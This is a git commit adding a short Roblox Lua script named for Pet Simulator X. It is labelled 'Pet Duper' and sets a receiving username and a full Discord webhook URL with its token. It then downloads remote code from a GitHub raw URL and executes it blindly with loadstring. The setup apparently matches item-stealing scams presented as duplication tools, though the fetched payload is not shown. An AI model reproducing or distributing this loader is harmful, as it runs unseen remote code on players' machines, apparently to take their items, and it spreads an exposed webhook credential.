42fd1d5bd108764cf5e47dee24b1a96459e100d4
landrex08 <130706756+landrex08@users.noreply.github.com>
2023-04-23 20:26:02 +0200

    Add files via upload

---
+++ psx script.lua
@@ -0,0 +1,4 @@
+_G.Username = "landrex_08"
+_G.HubName = "Pet Duper"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1096141763657334865/efEBYcFGYwv84I1UOCdwKya_eV5vemnhvlOvppHcBjIWJV614lCtHGpY7F0vmny0g0iG"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
